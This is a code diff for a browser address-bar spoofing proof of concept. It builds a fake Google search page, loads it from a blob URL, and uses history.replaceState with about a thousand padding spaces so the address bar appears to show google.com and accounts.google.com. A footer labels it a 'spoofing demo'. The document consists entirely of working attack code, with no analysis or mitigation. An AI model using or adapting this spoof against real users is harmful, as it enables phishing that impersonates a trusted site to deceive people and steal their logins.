@@ -1,6 +1,65 @@
 <script>
-var exp = 'FAKE GOOGLE<script>history.replaceState("","","google.com:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
-location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
+var exp = `<!DOCTYPE html>
+<html>
+<head>
+  <title>Google</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #202124;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .logo {
+      margin-bottom: 40px;
+    }
+    .logo img {
+      width: 272px;
+      height: 92px;
+    }
+    .search-bar {
+      width: 560px;
+      display: flex;
+      border: 1px solid #dfe1e5;
+      border-radius: 24px;
+      padding: 10px 20px;
+      box-shadow: 0 1px 6px rgba(32,33,36,.28);
+    }
+    .search-bar input {
+      border: none;
+      outline: none;
+      flex: 1;
+      font-size: 16px;
+    }
+    .footer {
+      position: absolute;
+      bottom: 20px;
+      font-size: 14px;
+      color: #70757a;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+  </div>
+  <div class="search-bar">
+    <input type="text" placeholder="Search Google or type a URL">
+  </div>
+  <div class="footer">
+    Fake Google UI for spoofing demo
+  </div>
+
+  <script>
+    history.replaceState("", "", "google.com:"+location.protocol+"//accounts.google.com"+Array(1000).join(" ")+"@"+location.host+"/");
+  <\/script>
+</body>
+</html>`;
+
+location = URL.createObjectURL(new Blob([exp], {type: "text/html"}));
 </script>
-
-
